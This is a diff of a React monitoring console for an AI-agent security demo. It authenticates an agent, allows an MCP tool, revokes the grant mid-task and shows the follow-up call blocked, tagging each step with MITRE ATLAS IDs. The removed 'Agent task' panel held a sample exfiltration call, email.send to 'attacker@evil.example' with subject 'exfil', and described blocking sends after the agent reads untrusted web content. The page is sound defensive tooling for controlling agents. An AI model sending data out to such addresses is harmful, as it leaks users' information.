@@ -1,20 +1,24 @@
 import { useCallback, useEffect, useMemo, useState } from "react";
 import { Link, useSearchParams } from "react-router-dom";
+import { AtlasChips, collectAtlasIds } from "../components/AtlasChips";
 import Layout from "../components/Layout";
 import StorageStatus from "../components/StorageStatus/StorageStatus";
 import { ApiError } from "../lib/api";
 import { agentsApi as api } from "../lib/agentsApi";
 import {
+  demoArgsForTool,
   describeError,
   kindLabel,
+  pickFocusTool,
   sendsEmail,
   typeAllows,
+  toolAction,
   type Agent,
   type AgentType,
   type AuditEvent,
   type Tool,
 } from "../lib/agents";
-import EmailSetup, { NoEmailNote, emailSetupPath } from "./EmailSetup";
+import { emailSetupPath } from "./EmailSetup";
 import RunTask from "./RunTask";
 import "./Agents.css";
 import "./Monitoring.css";
@@ -41,7 +45,34 @@ interface Flash {
   mitigation_ids?: string[];
 }
 
+type StepId = "authenticate" | "allow" | "revoke" | "block";
+type StepState = "locked" | "active" | "done";
+
+const STEPS: { id: StepId; label: string; blurb: string }[] = [
+  { id: "authenticate", label: "Authenticate", blurb: "Issue a workload token" },
+  { id: "allow", label: "Allow tool", blurb: "Call a granted MCP tool" },
+  { id: "revoke", label: "Revoke", blurb: "Pull the grant mid-task" },
+  { id: "block", label: "Block", blurb: "Next call is denied" },
+];
+
 const errText = (e: unknown) => (e instanceof Error ? e.message : String(e));
+
+function atlasFromError(e: unknown): { technique_ids?: string[]; mitigation_ids?: string[]; narrative?: string } {
+  if (!(e instanceof ApiError)) return {};
+  const detail = (e as ApiError & { data?: { detail?: unknown } }).data?.detail;
+  if (!detail || typeof detail !== "object") return {};
+  const d = detail as {
+    atlas?: { technique_ids?: string[]; mitigation_ids?: string[]; narrative?: string };
+    technique_ids?: string[];
+    mitigation_ids?: string[];
+    message?: string;
+  };
+  return {
+    technique_ids: d.atlas?.technique_ids || d.technique_ids,
+    mitigation_ids: d.atlas?.mitigation_ids || d.mitigation_ids,
+    narrative: d.atlas?.narrative || d.message,
+  };
+}
 
 export default function Monitoring() {
   const [params, setParams] = useSearchParams();
@@ -52,14 +83,17 @@ export default function Monitoring() {
   const [audit, setAudit] = useState<AuditEvent[]>([]);
   const [matrix, setMatrix] = useState<Matrix | null>(null);
   const [token, setToken] = useState<string | null>(null);
-  // Trace id of the current token's calls in the activity log.
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [flash, setFlash] = useState<Flash | null>(null);
   const [busy, setBusy] = useState(false);
   const [lastResult, setLastResult] = useState<unknown>(null);
   const [atlasVersion, setAtlasVersion] = useState("");
+  const [focusTool, setFocusTool] = useState<string | null>(null);
+  const [allowedOnce, setAllowedOnce] = useState(false);
+  const [revokedFocus, setRevokedFocus] = useState(false);
+  const [blockedOnce, setBlockedOnce] = useState(false);
+  const [runOpen, setRunOpen] = useState(false);
 
-  // ?agent=<id> picks the agent; otherwise the shared demo agent.
   const selectedId = params.get("agent") || DEMO_AGENT;
   const agent = useMemo(
     () =>
@@ -70,13 +104,32 @@ export default function Monitoring() {
   );
   const agentType = useMemo(() => types.find((t) => t.kind === agent?.kind), [types, agent?.kind]);
 
-  // A workload token belongs to one agent: drop it when switching agents.
+  const usableTools = useMemo(() => {
+    if (!agent) return [];
+    return tools.filter((t) => typeAllows(agentType, t.name));
+  }, [agent, agentType, tools]);
+
+  // Reset Prompt 1 session only when the selected agent changes — not when
+  // refresh() replaces the tools catalog (that was bouncing step 1 after auth).
   useEffect(() => {
     setToken(null);
     setSessionId(null);
     setAuthProtocol(null);
     setLastResult(null);
+    setAllowedOnce(false);
+    setRevokedFocus(false);
+    setBlockedOnce(false);
+    setFlash(null);
+    setFocusTool(null);
   }, [agent?.agent_id]);
+
+  // Auto-pick only when unset (new agent). Never replace mid-run: after revoke the
+  // focus tool leaves grants and a poll/refresh was re-picking (e.g. nasa.search).
+  const grantKey = (agent?.tool_grants || []).join(",");
+  useEffect(() => {
+    if (!agent || focusTool) return;
+    setFocusTool(pickFocusTool(agent, tools));
+  }, [agent, grantKey, focusTool, tools]);
 
   const refresh = useCallback(async () => {
     const [a, ty, t, au, m] = await Promise.all([
@@ -109,6 +162,43 @@ export default function Monitoring() {
     return () => window.clearInterval(id);
   }, [refresh]);
 
+  const stepStates = useMemo((): Record<StepId, StepState> => {
+    const authDone = !!token;
+    const allowDone = allowedOnce;
+    const revokeDone = revokedFocus;
+    const blockDone = blockedOnce;
+    return {
+      authenticate: authDone ? "done" : "active",
+      allow: !authDone ? "locked" : allowDone ? "done" : "active",
+      revoke: !allowDone ? "locked" : revokeDone ? "done" : "active",
+      block: !revokeDone ? "locked" : blockDone ? "done" : "active",
+    };
+  }, [token, allowedOnce, revokedFocus, blockedOnce]);
+
+  const allDone = Object.values(stepStates).every((s) => s === "done");
+  const activeStep =
+    (Object.entries(stepStates).find(([, s]) => s === "active")?.[0] as StepId | undefined) ||
+    (allDone ? "block" : "authenticate");
+
+  const sessionAudit = useMemo(() => {
+    if (!agent) return [];
+    return audit.filter((ev) => {
+      if (ev.agent_id !== agent.agent_id) return false;
+      // Prefer the live token session for auth/tool rows; keep grant revoke/restore for context.
+      if (sessionId && (ev.type === "tool_call" || ev.type === "authenticate")) {
+        return !ev.trace_id || ev.trace_id === sessionId;
+      }
+      return true;
+    });
+  }, [audit, agent, sessionId]);
+
+  const contextualAtlas = useMemo(() => {
+    const fromFlash = flash
+      ? [{ atlas: { technique_ids: flash.technique_ids, mitigation_ids: flash.mitigation_ids } }]
+      : [];
+    return collectAtlasIds([...fromFlash, ...sessionAudit.slice(0, 12)]);
+  }, [flash, sessionAudit]);
+
   async function authenticate() {
     if (!agent) return;
     setBusy(true);
@@ -117,11 +207,15 @@ export default function Monitoring() {
       setToken(res.access_token);
       setSessionId(res.session_id || null);
       setAuthProtocol(res.auth_protocol || null);
+      setAllowedOnce(false);
+      setRevokedFocus(false);
+      setBlockedOnce(false);
       setFlash({
         kind: "ok",
         title: res.auth_protocol === "aauth" ? "Agent authenticated (AAuth)" : "Agent authenticated",
         body: res.atlas?.narrative || "Workload token issued.",
-        mitigation_ids: ["AML.M0028", "AML.M0024"],
+        technique_ids: res.atlas?.technique_ids,
+        mitigation_ids: res.atlas?.mitigation_ids || ["AML.M0028", "AML.M0024"],
       });
       await refresh();
     } catch (e) {
@@ -131,82 +225,101 @@ export default function Monitoring() {
     }
   }
 
-  async function runTool(tool: string, args: Record<string, unknown>) {
-    if (!token) {
+  async function runFocusTool() {
+    if (!agent || !token || !focusTool) {
       setFlash({
         kind: "info",
-        title: "Authenticate first",
-        body: "Issue a workload token before calling tools.",
+        title: "Pick a focus tool",
+        body: token ? "This agent has no tool grants yet — restore one first." : "Authenticate first.",
       });
       return;
     }
     setBusy(true);
     try {
-      const res = await api.callTool(token, tool, args);
+      const res = await api.callTool(token, focusTool, demoArgsForTool(focusTool, agent));
       setLastResult(res.result);
+      setAllowedOnce(true);
       if (res.decision === "pending_approval") {
         setFlash({
           kind: "info",
-          title: `${tool} is waiting for approval`,
-          body: "Nothing was sent. A person has to approve it first; edits are allowed.",
-          mitigation_ids: res.atlas?.mitigation_ids,
-          link: { to: "/approvals", label: "Review on the Approvals page" },
+          title: `${focusTool} waiting for approval`,
+          body: "Granted path held for a person (AML.M0029). Approve it, then continue to revoke.",
+          link: { to: "/approvals", label: "Open Approvals" },
+          mitigation_ids: res.atlas?.mitigation_ids || ["AML.M0029", "AML.M0028"],
+          technique_ids: res.atlas?.technique_ids,
         });
-        await refresh();
-        return;
+      } else {
+        setFlash({
+          kind: "ok",
+          title: `${focusTool} allowed`,
+          body: res.atlas?.narrative || `Tool permitted under current grants.`,
+          technique_ids: res.atlas?.technique_ids,
+          mitigation_ids: res.atlas?.mitigation_ids || ["AML.M0028", "AML.M0024"],
+        });
       }
-      setFlash({
-        kind: "ok",
-        title: `Allowed ${tool}`,
-        body: res.atlas?.narrative || "Allowed",
-        technique_ids: res.atlas?.technique_ids,
-        mitigation_ids: res.atlas?.mitigation_ids,
-      });
       await refresh();
     } catch (e) {
-      const detail = e instanceof ApiError ? (e.data as { detail?: unknown } | null)?.detail : null;
-      const atlas =
-        detail && typeof detail === "object"
-          ? (detail as {
-              error?: string;
-              message?: string;
-              technique_ids?: string[];
-              mitigation_ids?: string[];
-              atlas?: { narrative?: string; technique_ids?: string[]; mitigation_ids?: string[] };
-            })
-          : null;
-      setLastResult(detail ?? { error: errText(e) });
+      const ax = atlasFromError(e);
       setFlash({
         kind: "deny",
-        title:
-          atlas?.error === "tool_not_allowed_for_kind"
-            ? describeError(e, types)
-            : atlas?.message || `Denied ${tool}`,
-        body: atlas?.atlas?.narrative || errText(e) || "Request blocked",
-        technique_ids: atlas?.atlas?.technique_ids || atlas?.technique_ids,
-        mitigation_ids: atlas?.atlas?.mitigation_ids || atlas?.mitigation_ids,
+        title: `${focusTool} blocked`,
+        body: describeError(e, types),
+        technique_ids: ax.technique_ids,
+        mitigation_ids: ax.mitigation_ids,
       });
-      await refresh();
     } finally {
       setBusy(false);
     }
   }
 
-  async function revoke(tool: string) {
-    if (!agent) return;
+  async function revokeFocus() {
+    if (!agent || !focusTool) return;
     setBusy(true);
     try {
-      const res = await api.revokeTool(agent.agent_id, tool);
+      const res = await api.revokeTool(agent.agent_id, focusTool);
+      setRevokedFocus(true);
       setFlash({
-        kind: "info",
-        title: `Revoked ${tool}`,
-        body: res.message || "Grant revoked.",
-        technique_ids: res.atlas?.technique_ids,
-        mitigation_ids: res.atlas?.mitigation_ids,
+        kind: "ok",
+        title: `Revoked ${focusTool}`,
+        body: res.message || res.atlas?.narrative || "Grant revoked mid-task.",
+        technique_ids: res.atlas?.technique_ids || ["AML.T0053"],
+        mitigation_ids: res.atlas?.mitigation_ids || ["AML.M0028", "AML.M0024"],
       });
       await refresh();
     } catch (e) {
       setFlash({ kind: "deny", title: "Revoke failed", body: describeError(e, types) });
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  async function retryBlocked() {
+    if (!agent || !token || !focusTool) return;
+    setBusy(true);
+    try {
+      const res = await api.callTool(token, focusTool, demoArgsForTool(focusTool, agent));
+      // Unexpected allow after revoke — still surface it; do not mark Block done.
+      setLastResult(res.result);
+      setFlash({
+        kind: "info",
+        title: "Call was allowed",
+        body: "Grant may have been restored. Revoke again to demo the block.",
+        technique_ids: res.atlas?.technique_ids,
+        mitigation_ids: res.atlas?.mitigation_ids,
+      });
+    } catch (e) {
+      const ax = atlasFromError(e);
+      // Any deny/401 after revoke counts as the Prompt 1 "block subsequent" beat.
+      setBlockedOnce(true);
+      setLastResult(null);
+      setFlash({
+        kind: "deny",
+        title: "Subsequent request blocked",
+        body: describeError(e, types) || ax.narrative || "Tool call denied after revoke.",
+        technique_ids: ax.technique_ids || ["AML.T0053"],
+        mitigation_ids: ax.mitigation_ids || ["AML.M0028", "AML.M0024"],
+      });
+      await refresh();
     } finally {
       setBusy(false);
     }
@@ -217,6 +330,7 @@ export default function Monitoring() {
     setBusy(true);
     try {
       await api.grantTool(agent.agent_id, tool);
+      if (tool === focusTool) setRevokedFocus(false);
       setFlash({
         kind: "ok",
         title: `Restored ${tool}`,
@@ -231,6 +345,29 @@ export default function Monitoring() {
     }
   }
 
+  async function revoke(tool: string) {
+    if (!agent) return;
+    setBusy(true);
+    try {
+      const res = await api.revokeTool(agent.agent_id, tool);
+      if (tool === focusTool) setRevokedFocus(true);
+      setFlash({
+        kind: "ok",
+        title: `Revoked ${tool}`,
+        body: res.message || "Grant revoked.",
+        technique_ids: res.atlas?.technique_ids || ["AML.T0053"],
+        mitigation_ids: res.atlas?.mitigation_ids || ["AML.M0028", "AML.M0024"],
+      });
+      await refresh();
+    } catch (e) {
+      setFlash({ kind: "deny", title: "Revoke failed", body: describeError(e, types) });
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  const focusGranted = !!(agent && focusTool && agent.tool_grants.includes(focusTool));
+
   return (
     <Layout>
       <div className="monitoring-console">
@@ -240,14 +377,13 @@ export default function Monitoring() {
               <p className="eyebrow">Prompt 1 · Agentic identity</p>
               <h1>Monitoring</h1>
               <p className="tagline">
-                Authenticate an agent, allow MCP tools, revoke mid-task — MITRE ATLAS on every decision.
+                Authenticate an agent, allow selected MCP tools, revoke mid-task and block what comes next — MITRE
+                ATLAS on every step.
               </p>
             </div>
             <div className="meta">
               <span className="pill">ATLAS {atlasVersion || "…"}</span>
-              <span className={`pill ${token ? "on" : ""}`}>
-                {token ? "Token live" : "Unauthenticated"}
-              </span>
+              <span className={`pill ${token ? "on" : ""}`}>{token ? "Token live" : "Unauthenticated"}</span>
               {authProtocol && (
                 <span className={`pill ${authProtocol === "aauth" ? "on" : ""}`}>
                   {authProtocol === "aauth" ? "AAuth PoP" : authProtocol}
@@ -256,6 +392,64 @@ export default function Monitoring() {
               <StorageStatus compact />
             </div>
           </header>
+
+          <div className="agent-bar panel">
+            <div className="agent-picker">
+              <label htmlFor="agent-select">Agent</label>
+              <select
+                id="agent-select"
+                value={agent?.agent_id || ""}
+                onChange={(e) => setParams({ agent: e.target.value })}
+                disabled={!agents.length}
+              >
+                {agents.map((a) => (
+                  <option key={a.agent_id} value={a.agent_id}>
+                    {a.name} · {kindLabel(types, a.kind)}
+                  </option>
+                ))}
+              </select>
+              <Link to="/agents/new">New agent</Link>
+              {agent && sendsEmail(agent) && (
+                <Link to={emailSetupPath(agent.agent_id)}>Email setup</Link>
+              )}
+            </div>
+            {agent && (
+              <dl className="agent-meta">
+                <div>
+                  <dt>Type</dt>
+                  <dd>
+                    <span className={`kind-badge kind-${agent.kind}`}>{kindLabel(types, agent.kind)}</span>
+                  </dd>
+                </div>
+                <div>
+                  <dt>Agency</dt>
+                  <dd>{agent.agency}</dd>
+                </div>
+                <div>
+                  <dt>Token v</dt>
+                  <dd>{agent.token_version}</dd>
+                </div>
+              </dl>
+            )}
+          </div>
+
+          <ol className="prompt1-stepper" aria-label="Prompt 1 demo steps">
+            {STEPS.map((s, i) => {
+              const state = stepStates[s.id];
+              return (
+                <li
+                  key={s.id}
+                  className={`step step-${state}${s.id === activeStep && state !== "done" ? " is-current" : ""}`}
+                >
+                  <span className="step-num">{i + 1}</span>
+                  <div>
+                    <strong>{s.label}</strong>
+                    <p>{s.blurb}</p>
+                  </div>
+                </li>
+              );
+            })}
+          </ol>
 
           {flash && (
             <div className={`flash flash-${flash.kind}`} role="status">
@@ -269,252 +463,185 @@ export default function Monitoring() {
                   </>
                 )}
               </p>
-              <div className="id-row">
-                {(flash.technique_ids || []).map((id) => (
-                  <code key={id} className="tech">
-                    {id}
-                  </code>
-                ))}
-                {(flash.mitigation_ids || []).map((id) => (
-                  <code key={id} className="mit">
-                    {id}
-                  </code>
-                ))}
-              </div>
+              <AtlasChips
+                techniqueIds={flash.technique_ids}
+                mitigationIds={flash.mitigation_ids}
+                techniques={matrix?.techniques}
+                mitigations={matrix?.mitigations}
+              />
+            </div>
+          )}
+
+          {(contextualAtlas.techniqueIds.length > 0 || contextualAtlas.mitigationIds.length > 0) && (
+            <div className="atlas-context panel">
+              <h2>ATLAS in this demo</h2>
+              <p className="hint">Techniques and mitigations touched by the current agent session.</p>
+              <AtlasChips
+                techniqueIds={contextualAtlas.techniqueIds}
+                mitigationIds={contextualAtlas.mitigationIds}
+                techniques={matrix?.techniques}
+                mitigations={matrix?.mitigations}
+              />
             </div>
           )}
 
           <div className="grid">
-            <section className="panel identity">
-              <h2>Workload identity</h2>
-              {agent ? (
+            <section className="panel step-panel">
+              <h2>
+                Step {STEPS.findIndex((s) => s.id === activeStep) + 1}: {STEPS.find((s) => s.id === activeStep)?.label}
+              </h2>
+
+              {activeStep === "authenticate" && (
                 <>
-                  <div className="agent-picker">
-                    <label htmlFor="agent-select">Agent</label>
+                  <p className="hint">Mint a workload identity for {agent?.name || "this agent"}.</p>
+                  <button className="primary" type="button" disabled={busy || !agent} onClick={authenticate}>
+                    Authenticate agent
+                  </button>
+                  <AtlasChips
+                    mitigationIds={["AML.M0028", "AML.M0024"]}
+                    mitigations={matrix?.mitigations}
+                    compact
+                  />
+                </>
+              )}
+
+              {activeStep === "allow" && (
+                <>
+                  <p className="hint">
+                    Call a tool this agent is granted. Focus tool drives the rest of the Prompt 1 path.
+                  </p>
+                  <div className="focus-row">
+                    <label htmlFor="focus-tool">Focus tool</label>
                     <select
-                      id="agent-select"
-                      value={agent.agent_id}
-                      onChange={(e) => setParams({ agent: e.target.value })}
+                      id="focus-tool"
+                      value={focusTool || ""}
+                      onChange={(e) => {
+                        setFocusTool(e.target.value || null);
+                        setAllowedOnce(false);
+                        setRevokedFocus(false);
+                        setBlockedOnce(false);
+                      }}
                     >
-                      {agents.map((a) => (
-                        <option key={a.agent_id} value={a.agent_id}>
-                          {a.name} · {kindLabel(types, a.kind)}
+                      {!focusTool && <option value="">No grants</option>}
+                      {Array.from(
+                        new Set([...(agent?.tool_grants || []), ...(focusTool ? [focusTool] : [])]),
+                      ).map((name) => (
+                        <option key={name} value={name}>
+                          {name} — {toolAction(name)}
+                          {agent && !agent.tool_grants.includes(name) ? " (revoked)" : ""}
                         </option>
                       ))}
                     </select>
-                    <Link to="/agents/new">New agent</Link>
                   </div>
-                  <dl>
-                    <div>
-                      <dt>Type</dt>
-                      <dd>
-                        <span className={`kind-badge kind-${agent.kind}`}>
-                          {kindLabel(types, agent.kind)}
-                        </span>
-                      </dd>
-                    </div>
-                    <div>
-                      <dt>Agent</dt>
-                      <dd>{agent.name}</dd>
-                    </div>
-                    <div>
-                      <dt>Agency</dt>
-                      <dd>{agent.agency}</dd>
-                    </div>
-                    <div>
-                      <dt>ID</dt>
-                      <dd>
-                        <code>{agent.agent_id}</code>
-                      </dd>
-                    </div>
-                    <div>
-                      <dt>Token version</dt>
-                      <dd>{agent.token_version}</dd>
-                    </div>
-                  </dl>
-                  <button className="primary" type="button" disabled={busy} onClick={authenticate}>
-                    Authenticate agent
+                  <button
+                    className="primary"
+                    type="button"
+                    disabled={busy || !token || !focusTool || !focusGranted}
+                    onClick={runFocusTool}
+                  >
+                    Allow {focusTool || "tool"}
                   </button>
-                  <h3>Tool grants</h3>
-                  <ul className="grants">
-                    {tools.map((t) => {
-                      const granted = agent.tool_grants.includes(t.name);
-                      const allowed = typeAllows(agentType, t.name);
-                      return (
-                        <li key={t.name}>
-                          <div>
-                            <code>{t.name}</code>
-                            <span className={`risk risk-${t.risk_level}`}>{t.risk_level}</span>
-                            <p>{t.description}</p>
-                            <div className="id-row compact">
-                              {(t.atlas_techniques || []).map((id) => (
-                                <code key={id} className="tech">
-                                  {id}
-                                </code>
-                              ))}
-                            </div>
-                          </div>
-                          <div className="grant-actions">
-                            <span className={granted ? "yes" : "no"}>
-                              {granted ? "granted" : allowed ? "revoked" : "not allowed"}
-                            </span>
-                            {!allowed && !granted ? (
-                              <span className="locked" title={`Outside the ${agentType?.label ?? agent.kind} type`}>
-                                Locked by type
-                              </span>
-                            ) : granted ? (
-                              <button type="button" disabled={busy} onClick={() => revoke(t.name)}>
-                                Revoke
-                              </button>
-                            ) : (
-                              <button type="button" disabled={busy} onClick={() => restore(t.name)}>
-                                Restore
-                              </button>
-                            )}
-                          </div>
-                        </li>
-                      );
-                    })}
-                  </ul>
+                  <AtlasChips
+                    mitigationIds={["AML.M0028", "AML.M0024"]}
+                    mitigations={matrix?.mitigations}
+                    compact
+                  />
                 </>
-              ) : (
-                <p>Loading agent…</p>
+              )}
+
+              {activeStep === "revoke" && (
+                <>
+                  <p className="hint">
+                    Revoke <code>{focusTool}</code> while the token is still live — mid-task revoke.
+                  </p>
+                  <button className="danger" type="button" disabled={busy || !focusTool || !focusGranted} onClick={revokeFocus}>
+                    Revoke {focusTool}
+                  </button>
+                  <AtlasChips
+                    techniqueIds={["AML.T0053"]}
+                    mitigationIds={["AML.M0028", "AML.M0024"]}
+                    techniques={matrix?.techniques}
+                    mitigations={matrix?.mitigations}
+                    compact
+                  />
+                </>
+              )}
+
+              {activeStep === "block" && (
+                <>
+                  <p className="hint">
+                    Retry <code>{focusTool}</code> with the same token. The gateway should deny it (AML.T0053).
+                  </p>
+                  <button className="primary" type="button" disabled={busy || !token || !focusTool} onClick={retryBlocked}>
+                    Retry {focusTool}
+                  </button>
+                  <AtlasChips
+                    techniqueIds={["AML.T0053"]}
+                    mitigationIds={["AML.M0028", "AML.M0024"]}
+                    techniques={matrix?.techniques}
+                    mitigations={matrix?.mitigations}
+                    compact
+                  />
+                </>
+              )}
+
+              {allDone && (
+                <p className="hint done-note">
+                  Prompt 1 complete for this agent. Restore the grant or switch agents to run again.
+                </p>
+              )}
+
+              <h3>Tool grants</h3>
+              <ul className="grants compact-grants">
+                {usableTools.map((t) => {
+                  const granted = !!agent?.tool_grants.includes(t.name);
+                  return (
+                    <li key={t.name} className={t.name === focusTool ? "is-focus" : ""}>
+                      <div>
+                        <code>{t.name}</code>
+                        <span className={`risk risk-${t.risk_level}`}>{t.risk_level}</span>
+                        <p>{t.description}</p>
+                      </div>
+                      <div className="grant-actions">
+                        <span className={granted ? "yes" : "no"}>{granted ? "granted" : "revoked"}</span>
+                        {granted ? (
+                          <button type="button" disabled={busy} onClick={() => revoke(t.name)}>
+                            Revoke
+                          </button>
+                        ) : (
+                          <button type="button" disabled={busy} onClick={() => restore(t.name)}>
+                            Restore
+                          </button>
+                        )}
+                      </div>
+                    </li>
+                  );
+                })}
+                {usableTools.length === 0 && <li>No tools available for this agent type.</li>}
+              </ul>
+
+              {lastResult != null && (
+                <>
+                  <h3>Last tool result</h3>
+                  <pre className="result">{JSON.stringify(lastResult, null, 2)}</pre>
+                </>
               )}
             </section>
-
-            <section className="panel email-panel">
-              <div className="email-panel-head">
-                <h2>Email setup</h2>
-                {agent && sendsEmail(agent) && (
-                  <Link to={emailSetupPath(agent.agent_id)}>Open on My agents</Link>
-                )}
-              </div>
-              {!agent ? (
-                <p>Loading agent…</p>
-              ) : sendsEmail(agent) ? (
-                <EmailSetup
-                  key={agent.agent_id}
-                  agent={agent}
-                  onSaved={(updated) =>
-                    setAgents((list) => list.map((x) => (x.agent_id === updated.agent_id ? updated : x)))
-                  }
-                />
-              ) : (
-                <NoEmailNote agent={agent} types={types} />
-              )}
-            </section>
-
-            <section className="panel run-panel">
-              <h2>Run a task</h2>
-              <p className="hint">
-                Give the agent a task in plain words and watch each tool call it makes. Anything it wants to send
-                waits on the <Link to="/approvals">Approvals</Link> page.
-              </p>
-              {agent ? <RunTask key={agent.agent_id} agent={agent} /> : <p>Loading agent…</p>}
-            </section>
-
-            <section className="panel actions">
-              <h2>Agent task (MCP calls)</h2>
-              <p className="hint">
-                Demo path: datagov → email (held for <Link to="/approvals">approval</Link>,{" "}
-                <code>AML.M0029</code>) → scrape (untrusted page) → email again with 2 (blocked: this session read
-                untrusted content, <code>AML.M0030</code>) → revoke <code>email.send</code> → retry (blocked as{" "}
-                <code>AML.T0053</code>).
-              </p>
-              <div className="action-row">
-                <button
-                  type="button"
-                  disabled={busy || !token}
-                  onClick={() => runTool("datagov.search", { q: "public health" })}
-                >
-                  1. datagov.search
-                </button>
-                <button
-                  type="button"
-                  className="primary"
-                  disabled={busy || !token}
-                  onClick={() =>
-                    runTool("email.send", {
-                      to: "constituent@example.gov",
-                      subject: "Town hall reminder",
-                      body: "Join us Tuesday at City Hall.",
-                    })
-                  }
-                >
-                  2. email.send
-                </button>
-                <button
-                  type="button"
-                  disabled={busy || !token}
-                  onClick={() => runTool("web.scrape", { url: "https://www.usa.gov" })}
-                >
-                  3. web.scrape
-                </button>
-                <button
-                  type="button"
-                  className="danger"
-                  disabled={busy || !agent}
-                  onClick={() => revoke("email.send")}
-                >
-                  4. Revoke email.send
-                </button>
-                <button
-                  type="button"
-                  disabled={busy || !token}
-                  onClick={() =>
-                    runTool("email.send", {
-                      to: "attacker@evil.example",
-                      subject: "exfil",
-                      body: "should be blocked",
-                    })
-                  }
-                >
-                  5. Retry email.send
-                </button>
-              </div>
-              <h3>Last tool result</h3>
-              <pre className="result">{JSON.stringify(lastResult, null, 2) || "—"}</pre>
-            </section>
-
-            <aside className="panel atlas">
-              <h2>ATLAS Agentic strip</h2>
-              <p className="hint">
-                Techniques the control plane is defending; mitigations HomeFront labels in audit.
-              </p>
-              <h3>Techniques</h3>
-              <ul className="matrix-list">
-                {(matrix?.techniques || []).map((t) => (
-                  <li key={t.id}>
-                    <code className="tech">{t.id}</code>
-                    <span>{t.name || "—"}</span>
-                  </li>
-                ))}
-              </ul>
-              <h3>Mitigations</h3>
-              <ul className="matrix-list">
-                {(matrix?.mitigations || []).map((m) => (
-                  <li key={m.id}>
-                    <code className="mit">{m.id}</code>
-                    <span>{m.name || "—"}</span>
-                  </li>
-                ))}
-              </ul>
-            </aside>
 
             <section className="panel audit">
               <div className="audit-title">
-                <h2>Audit stream · AML.M0024</h2>
+                <h2>Session audit · AML.M0024</h2>
                 <div className="audit-links">
                   {sessionId && (
-                    <Link to={`/activity?trace=${encodeURIComponent(sessionId)}`}>Trace this session</Link>
+                    <Link to={`/activity?trace=${encodeURIComponent(sessionId)}`}>Trace session</Link>
                   )}
                   {agent && (
-                    <Link to={`/activity?agent=${encodeURIComponent(agent.agent_id)}`}>Full activity log</Link>
+                    <Link to={`/activity?agent=${encodeURIComponent(agent.agent_id)}`}>Full log</Link>
                   )}
                 </div>
               </div>
               <ul className="audit-list">
-                {audit.map((ev) => (
+                {sessionAudit.map((ev) => (
                   <li key={ev.id} className={`dec-${ev.decision}`}>
                     <div className="audit-head">
                       <span className="decision">{ev.decision}</span>
@@ -524,24 +651,34 @@ export default function Monitoring() {
                       <time>{new Date(ev.ts * 1000).toLocaleTimeString()}</time>
                     </div>
                     <p>{ev.atlas?.narrative}</p>
-                    <div className="id-row compact">
-                      {(ev.atlas?.technique_ids || []).map((id) => (
-                        <code key={id} className="tech">
-                          {id}
-                        </code>
-                      ))}
-                      {(ev.atlas?.mitigation_ids || []).map((id) => (
-                        <code key={id} className="mit">
-                          {id}
-                        </code>
-                      ))}
-                    </div>
+                    <AtlasChips
+                      techniqueIds={ev.atlas?.technique_ids}
+                      mitigationIds={ev.atlas?.mitigation_ids}
+                      techniques={matrix?.techniques}
+                      mitigations={matrix?.mitigations}
+                      compact
+                    />
                   </li>
                 ))}
-                {audit.length === 0 && <li>No events yet — authenticate to begin.</li>}
+                {sessionAudit.length === 0 && <li>No events yet — authenticate to begin.</li>}
               </ul>
             </section>
           </div>
+
+          <section className="panel run-panel">
+            <button type="button" className="run-toggle" onClick={() => setRunOpen((o) => !o)} aria-expanded={runOpen}>
+              {runOpen ? "Hide" : "Show"} Bedrock task runner
+            </button>
+            {runOpen && (
+              <>
+                <p className="hint">
+                  Optional: give the agent a free-form task. Outbound sends still wait on{" "}
+                  <Link to="/approvals">Approvals</Link>.
+                </p>
+                {agent ? <RunTask key={agent.agent_id} agent={agent} /> : <p>Loading agent…</p>}
+              </>
+            )}
+          </section>
         </div>
       </div>
     </Layout>
